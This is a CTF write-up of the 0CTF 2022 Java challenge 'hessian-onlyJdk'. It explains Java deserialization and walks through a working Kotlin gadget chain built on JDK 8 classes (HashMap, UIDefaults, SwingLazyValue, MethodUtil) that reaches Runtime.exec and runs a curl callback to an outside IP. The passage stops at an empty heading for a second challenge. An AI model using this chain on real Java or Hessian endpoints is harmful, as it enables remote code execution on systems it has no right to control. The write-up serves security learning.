---
title: "Java challs - 0CTF 2022"
date: 2022-09-27 13:37:31
description: Java challs - 0CTF 2022
---

I played 0ctf with Super Guesser and mainly focused on 4 web challs out of which I was able to solve 2 of them but couldnt solve the other 2 JAVA challs, so I thought this could be a good time to solve the leftover challs and learn JAVA alongside. This is writeup of 2 JAVA challs from 0ctf namely
1. hessian-onlyJdk 
2. 3rm1

## hessian-onlyJdk

### Introduction & Setup

We were given a java application [Source code with docker attached](/website/assets/source/0ctf-hessian-onlyJdk) which takes user input as POST body and uses the `hessian` Library to parse the POST Input. The Vulnerability was straight forward to discover from the source : `Index.java`
```java
try {
    final InputStream is = t.getRequestBody(); // `is` is POST body
    final Hessian2Input input = new Hessian2Input(is); 
    input.readObject();
}
catch (Exception e) {
    e.printStackTrace();
    response = "oops! something is wrong";
}
```

here, `input.readObject()` is vulnerable to Insecure deserialization and our goal was to find exploit(Java Gadget chain), send it as POST body and achieve RCE. We can try to use gadget chains from ysoserial and other places but none worked, so we will have to create our own gadget chain now.


### Learning JAVA to find Gadget chain

First step was to understand how JAVA deserialization works. I came accorss this nice talk from [blackhat](https://www.youtube.com/watch?v=wPbW6zQ52w8)

The basic idea of deserialization is follows:

1. The code `input.readObject()` means, whatever `Object` we send in the POST body, it will call `readObject` method of it and we as attacker wanna make sure we achive rce when code calls this method. 
Now we cannot send any object ofcourse, the Object we are sending should exist in classPath of the running code. ClassPath is nothing but list of available classes. 

Example, suppose there is a class myClass.java somewhere in the code like this

```java

import java.io.ObjectInputStream;
import java.io.IOException;
import java.io.Serializable;

public class StartVuln {
    Vulnclass m;

    public void readObj(ObjectInputStream s) {
        try {
            m = (Vulnclass) s.readObject();
            m.hax();
        }catch (Exception e) {
            System.out.println(e);
        }
    }
}

public class Vulnclass implements Serializable {

    String cmd = "whoami";
    public void hax() throws IOException {
        System.out.println("Executing" + this.cmd.toString());
        System.out.println(Runtime.getRuntime().exec(this.cmd));
    }
}
```

Now if the main program either belongs to same package or this class included while running the JAVA application, we should be able to access this Class, otherwise we wont be able to access it. Lets say this class is included in classpath while runing the program like:

```bash
$ java -classpath=/path/to/above.jar -jar main.jar
```

we can create a payload like below to get RCE

```kotlin

package com.test;

import Vulnclass
import StartVuln
import org.joor.Reflect
import java.io.ByteArrayInputStream
import java.io.ByteArrayOutputStream
import java.io.ObjectInputStream
import java.io.ObjectOutputStream


fun main(args: Array<String>) {
    println("Start")

    var gadget = createGadget() // This is the ain gadget

    // Rest of the code below
    // is just wrapper to convert the object to `objectInputStream`

    var baos = ByteArrayOutputStream();
    var oos = ObjectOutputStream(baos);

    oos.writeObject(gadget);

    oos.flush();
    oos.close();

    var byteArrayInputStream = ByteArrayInputStream(baos.toByteArray());
    var objectInputStream = ObjectInputStream(byteArrayInputStream);


    // Vulnerablity exploit start here
    StartVuln().readObj(objectInputStream);

}

fun createGadget() : Any {
    return Reflect.onClass("Vulnclass").create().set("cmd", "open /").get();
}
```

Since `Vulnclass` has Serialiable implemented, we should be able to serialize this class. When any code runs `readobject` on it, the code should be able to recover the Object of this class with instance variables(public/private) set to what we wanted it to be.


### Finding Gadget chain to exploit Hessian Library

As seen above, now we know how to create Gadget chain , next step is to find which code to look the Gadget chain at. Like I said , all the `Serializable` class's accessible to the application are possible victim, this includes

1. Entire JAVA JDK
2. Classe's in classpath's included while running app (libraries, jar files etc.)

The application above uses quite few libraries and JDK version 1.8(also known as [JDK 8](https://github.com/frohoff/jdk8u-jdk/)) So our goal would be to find Gadget chain in them to achieve RCE.

Here's the Gadget chain we will be using to attack 

```kotlin

import sun.reflect.misc.MethodUtil // part of JDK 1.8
import java.lang.reflect.Method


private fun createGadget(): Any {

    // reflection API uses slot to tell which function to call
    var invokeSlot = 6
    var execSlot = 17

    val invokeMethod = MethodUtil::class.java.getMethod(
        "invoke",
        Method::class.java, Any::class.java, emptyArray<Any>().javaClass
    ).also { Reflect.on(it).set("slot", invokeSlot) }

    val execMethod = Runtime::class.java.getMethod(
        "exec",
        String::class.java
    ).also { Reflect.on(it).set("slot", execSlot) }


    val cmd = "curl http://192.168.29.80:1235"
    val args = arrayOf<Any>(execMethod, Runtime.getRuntime() as Any, arrayOf<Any>(cmd))

    val value = SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", arrayOf(invokeMethod, Any(), args)) 
    // https://github.com/frohoff/jdk8u-jdk/blob/master/src/share/classes/sun/swing/SwingLazyValue.java#L57  signature of SwingLazyValue


    
    val u1 = UIDefaults().apply { put("_", value) }
    val u2 = UIDefaults().apply { put("_", value) } 
    
    val hashMap = HashMap<Any, Any>()
    val rNode = Reflect.onClass("java.util.HashMap\$Node")

    val array = java.lang.reflect.Array.newInstance(rNode.get(), 2) // create Array of size 2 of type rnode(java.util.HashMap$Node)
    java.lang.reflect.Array.set(array, 0, rNode.create(0, u1, null, null).get()) // set 0th index ,
    java.lang.reflect.Array.set(array, 1, rNode.create(0, u2, null, null).get())// set 1st index
    Reflect.on(hashMap).set("size", 2).set("table", array)
    
    return hashMap
}
```

Lets decouple the chain shall we:

1. Part 1: getting the methods to execute

We will be using reflection in kotlin to get methods

![howreflection-kotlin](/website/assets/images/0ctf-2.png)

```kotlin

val invokeMethod = MethodUtil::class.java.getMethod(
    "invoke",
    Method::class.java, Any::class.java, emptyArray<Any>().javaClass
).also { Reflect.on(it).set("slot", invokeSlot) }

// MethodUtil::class -> getting the runtime reference to a statically/known class
//      .java is same as using getClass() on object to get the class info
//      .getMethod("methodname", signature) is java reflection API to get the method 

// signature of MethodUtil.invoke method :
//      public static Object invoke(Method m, Object obj, Object[] params)


val execMethod = Runtime::class.java.getMethod(
    "exec",
    String::class.java
).also { Reflect.on(it).set("slot", execSlot) }

// same as Runtime.getClass().getMethod("exec", signature)
```


2. Setting up command executing function

Our goal is to call `SwingLazyValue.createValue` since it has the following code:

![rce-swingvalue](/website/assets/images/0ctf-1.png)

It takes classname, methodname and string array and execute `m.invoke(c, args);` on it. So, here we want m to be equal to `Runtime.exec` and args to be the cmd to execute

```kotlin
val cmd = "curl http://192.168.29.80:1235"
val args = arrayOf<Any>(execMethod, Runtime.getRuntime() as Any, arrayOf<Any>(cmd))

val value = SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", arrayOf(invokeMethod, Any(), args)) 

```

The above is same as
```
c = SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", [Method::Runtime.exec, Runtime.getRuntime(), ["curl site.com"]]);
```

Like in the pic above, now if we do `c.createValue`, we will get command execution from the line `m.invoke(c, args);` (m here is Methodutil, c is "invoke" and args is the array)

3. setting up chain to reach the reach the `SwingLazyValue.createValue` function

![rce-swingvalue-chain](/website/assets/images/0ctf-3.png)

Here we can see, the `getFromHashTable` function of `UIDefaults` class, calls `super.get(key)` on a hashtable entry and if the value is LazyValue(i.e Object), it just calls `Object.createValue` on it, and that what we wanted, soo,

```kotlin
val u2 = UIDefaults().also { it.put("_", SwingLazyValue(...)) } 
```

Now if in code there is a call to `u2.getFromHashtable("_")`, it will call `(SwingLazyValue).createValue(this);` and we will get RCE. So we need a way to now call `u2.getFromHashtable`. Actually the function `getFromHashtable` is called by `.get` function of `UIDefaults`

![rce-swingvalue-chain](/website/assets/images/0ctf-5.png)

We need to find a way to call `UIDefaults.get("_")`. Now this definately looks achievable. Actually, if we wrap `UIDefaults` object around `HashMap`, when a `HashMap` is deserialized, it calls `.get` on each `key` to check if key already exist in map or not. So now we just have to wrap the `UIDefaults` Object around HashMap and it will call following

![rce-swingvalue-chain](/website/assets/images/0ctf-4.png)

The `putval` function calls `key.equals(k)` (here key is Object of class UIDefaults):

![rce-swingvalue-chain](/website/assets/images/0ctf-6.png)


The `UIDefaults` class doesnt itself have `equals` function but since it extends `HashTable`, we can find the `equals` function inside `HashTable` as below

![rce-swingvalue-chain](/website/assets/images/0ctf-8.png)

And we can see it calls `.get` on the key (ie UIDefaults). So chain looks like

```
{
    UIDefaults::Object : SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", [Method::Runtime.exec, Runtime.getRuntime(), ["curl site.com"]]),

    UIDefaults::Object : SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", [Method::Runtime.exec, Runtime.getRuntime(), ["curl site.com"]]),
}
```

SUMMARY: When the hashmap is deserialized, 
1. it will call `putVal(key, val)` 

    IMP: key here is `UIDefaults` object

    since we have 2 keys, it will call putval for 1st key and then 2nd key. while doing it for 2nd key, since the hashmap is not empty, it will check if the key aready exist or not by calling `key.equals(key2)` 

2. `key.equals(k2)` call `equals` method of `Hashtable` class which also exist in `Uidefault` class since it extends `Hashtable`. The `Hashtable` or `Uidefaults.equals()` calls `Uidefaults.get("_")` 

3. `UiDefaults.get` calls `getFromHashtable` function on the value of `UiDefaults.get("_")` which is  SwingLazyValue payload and thus gives us RCE.

Putting it all together in code:

```kotlin
val u1 = UIDefaults().also { it.put("_", value) }
val u2 = UIDefaults().also { it.put("_", value) } 

val hashMap = HashMap<Any, Any>()
val rNode = Reflect.onClass("java.util.HashMap\$Node")

val array = java.lang.reflect.Array.newInstance(rNode.get(), 2) // create Array of size 2 of type rnode(java.util.HashMap$Node)

java.lang.reflect.Array.set(array, 0, rNode.create(0, u1, null, null).get()) // set 0th index ,
java.lang.reflect.Array.set(array, 1, rNode.create(0, u2, null, null).get())// set 1st index

// signature public static void set(Object array, int index, Object value)

Reflect.on(hashMap).set("size", 2).set("table", array)

return hashMap
```

This would be the complete chain. The hashMap object now obtained, if we call `hashMap.readObj()` on it, the deserialization chain will start and we should get RCE.


## 3rm1